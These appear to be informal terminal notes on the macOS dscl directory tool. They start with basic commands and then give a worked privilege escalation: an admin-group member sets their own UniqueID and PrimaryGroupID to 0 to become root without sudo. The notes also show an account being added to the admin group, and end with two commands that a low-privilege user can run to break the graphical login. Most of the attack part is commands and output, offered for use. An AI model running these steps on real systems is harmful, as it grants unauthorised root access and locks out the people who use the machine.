interactive shell info

q + "enter" = quit
ctrl + c = quit
ctrl + d = quit

```
Yays-Mac:~ yayusernameyay$ dscl
Entering interactive mode... (type "help" for commands)
 > q
Goodbye
Yays-Mac:~ yayusernameyay$ ps ax | grep dscl
  947 s000  S+     0:00.01 grep dscl```

ls = list
`Yays-Mac:~ yayusernameyay$ dscl
Entering interactive mode... (type "help" for commands)
 > ls
Local

Contact
Search`


run dscl while authentiated as a user

`Yays-Mac:~ yayusernameyay$ dscl . read /users/yayusernameyay PrimaryGroupID
PrimaryGroupID: 20
Yays-Mac:~ yayusernameyay$ dscl . read /users/yayusernameyay UniqueID
UniqueID: 501
Yays-Mac:~ yayusernameyay$ dscl -u yayusernameyay -P yaypasswordyay . change /users/yayusernameyay PrimaryGroupID 20 0
Yays-Mac:~ yayusernameyay$ dscl -u yayusernameyay -P yaypasswordyay . change /users/yayusernameyay UniqueID 501 0
Yays-Mac:~ yayusernameyay$ dscl . read /users/yayusernameyay PrimaryGroupID
PrimaryGroupID: 0
Yays-Mac:~ yayusernameyay$ dscl . read /users/yayusernameyay UniqueID
UniqueID: 0`

or

`Yays-Mac:~ yayusernameyay$ dscl
Entering interactive mode... (type "help" for commands)
 > cd /Local/Default/Users/yayusernameyay/
/Local/Default/Users/yayusernameyay > read . PrimaryGroupID
PrimaryGroupID: 20
/Local/Default/Users/yayusernameyay > change . PrimaryGroupID 20 0
<main> attribute status: eDSPermissionError
<dscl_cmd> DS Error: -14120 (eDSPermissionError)
/Local/Default/Users/yayusernameyay > auth yayusernameyay yaypasswordyay
/Local/Default/Users/yayusernameyay > change . PrimaryGroupID 20 0
/Local/Default/Users/yayusernameyay > read . PrimaryGroupID
PrimaryGroupID: 0`


there are some keys that you need to be a part of groupID 80 to change:
`Yays-Mac:~ boousernameboo$ dscl . read /groups/admin
dsAttrTypeNative:record_daemon_version: 4890000
AppleMetaNodeLocation: /Local/Default
GeneratedUID: ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000050
GroupMembers: FFFFEEEE-DDDD-CCCC-BBBB-AAAA00000000 3213A73F-B77D-4C5F-A589-514EB904749C
GroupMembership: root yayusernameyay
Password: *
PrimaryGroupID: 80
RealName: Administrators
RecordName: admin BUILTIN\Administrators
RecordType: dsRecTypeStandard:Groups
SMBSID: S-1-5-32-544
Yays-Mac:~ boousernameboo$ dscl -u boousernameboo -P boopasswordboo . change /users/boousernameboo PrimaryGroupID 20 100
<main> attribute status: eDSPermissionError
<dscl_cmd> DS Error: -14120 (eDSPermissionError)
Yays-Mac:~ boousernameboo$ dscl -u yayusernameyay -P yaypasswordyay . append /groups/admin GroupMembership boousernameboo
Yays-Mac:~ boousernameboo$ dscl -u boousernameboo -P boopasswordboo . change /users/boousernameboo PrimaryGroupID 20 100
Yays-Mac:~ boousernameboo$ dscl . read /groups/admin
dsAttrTypeNative:record_daemon_version: 4890000
AppleMetaNodeLocation: /Local/Default
GeneratedUID: ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000050
GroupMembers: FFFFEEEE-DDDD-CCCC-BBBB-AAAA00000000 3213A73F-B77D-4C5F-A589-514EB904749C
GroupMembership: root yayusernameyay boousernameboo
Password: *
PrimaryGroupID: 80
RealName: Administrators
RecordName: admin BUILTIN\Administrators
RecordType: dsRecTypeStandard:Groups
SMBSID: S-1-5-32-544
Yays-Mac:~ boousernameboo$ dscl -u boousernameboo -P boopasswordboo . read /users/boousernameboo PrimaryGroupID
PrimaryGroupID: 100`

as long as you are a part of groupID 80, you can privesc to root without sudo:
`Yays-Mac:~ boousernameboo$ id
uid=502(boousernameboo) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
Yays-Mac:~ boousernameboo$ sudo bash
Password:
boousernameboo is not in the sudoers file.  This incident will be reported.
Yays-Mac:~ boousernameboo$ dscl . read /users/boousernameboo UniqueID
UniqueID: 502
Yays-Mac:~ boousernameboo$ dscl . read /users/boousernameboo PrimaryGroupID
PrimaryGroupID: 20
Yays-Mac:~ boousernameboo$ dscl -u boousernameboo -P boopasswordboo . change /users/boousernameboo PrimaryGroupID 20 0
Yays-Mac:~ boousernameboo$ dscl -u boousernameboo -P boopasswordboo . change /users/boousernameboo UniqueID 502 0
Yays-Mac:~ boousernameboo$ dscl . read /users/boousernameboo UniqueID
UniqueID: 0
Yays-Mac:~ boousernameboo$ dscl . read /users/boousernameboo PrimaryGroupID
PrimaryGroupID: 0`
after the above, logout then login and you'll login as root.

semi brick the macos system? at least the user interface freaks out and doesn't allow logins. can be done as a low level users. services like ssh will still work:
`dscl . delete /Users/boousernameboo JPEGPhoto
dscl . append /Users/boousernameboo JPEGPhoto test`
